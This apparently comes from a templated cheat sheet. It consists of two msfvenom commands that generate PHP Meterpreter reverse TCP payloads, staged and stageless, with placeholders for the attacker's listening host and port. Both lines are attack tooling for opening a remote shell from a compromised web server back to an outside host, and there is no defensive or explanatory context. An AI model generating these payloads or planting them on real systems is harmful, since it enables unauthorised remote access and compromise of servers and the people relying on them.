msfvenom -p php/meterpreter_reverse_tcp -f raw LHOST={{ LHOST }} LPORT={{ LPORT }}
msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST={{ LHOST }} LPORT={{ LPORT }}
